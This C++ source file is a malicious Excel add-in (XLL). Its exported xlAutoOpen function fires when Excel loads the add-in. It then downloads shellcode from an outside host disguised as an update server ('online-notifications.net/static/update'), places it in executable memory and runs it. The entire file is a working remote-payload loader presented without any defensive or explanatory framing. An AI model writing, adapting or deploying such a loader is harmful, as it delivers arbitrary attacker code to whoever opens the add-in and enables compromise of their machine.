//downloads shellcode from a remote server and executes it in memory.

#include <windows.h>
#include <winhttp.h>
#include <vector>

#pragma comment(lib, "winhttp.lib")

// Download shellcode from remote server
std::vector<BYTE> DownloadShellcode(LPCWSTR baseAddress, LPCWSTR filename) {
    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;
    BYTE temp[4096]{};

    HINTERNET hSession = WinHttpOpen(NULL,
                                     WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS,
                                     0);

    if (!hSession) return buffer;

    HINTERNET hConnect = WinHttpConnect(hSession, baseAddress, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return buffer;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", filename,
                                            NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            WINHTTP_FLAG_SECURE);

    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                           WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
        WinHttpReceiveResponse(hRequest, NULL)) {

        do {
            ZeroMemory(temp, sizeof(temp));
            if (!WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead))
                break;
            if (bytesRead > 0)
                buffer.insert(buffer.end(), temp, temp + bytesRead);
        } while (bytesRead > 0);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}

// Shellcode executor
void ExecuteShellcode() {
    std::vector<BYTE> shellcode = DownloadShellcode(L"online-notifications.net", L"/static/update");

    if (shellcode.empty())
        return;

    LPVOID execMem = VirtualAlloc(NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem)
        return;

    memcpy(execMem, shellcode.data(), shellcode.size());
    ((void(*)())execMem)();  // Run the shellcode
}

// Excel will call this on Add-in load
extern "C" __declspec(dllexport) int WINAPI xlAutoOpen(void) {
    ExecuteShellcode();  // Trigger on Excel load
    return 1;            // Return success to Excel
}
